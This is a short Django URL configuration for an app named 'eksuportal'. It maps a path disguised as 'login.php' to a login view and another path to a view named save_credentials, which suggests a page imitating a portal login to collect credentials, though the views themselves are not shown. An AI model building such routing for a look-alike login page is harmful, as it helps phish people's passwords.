from django.urls import path
from . import views

app_name = 'eksuportal'

urlpatterns = [
    path('login.php', views.login, name='login'),
    path('eksuportal/save', views.save_credentials, name='save_cred'),
]
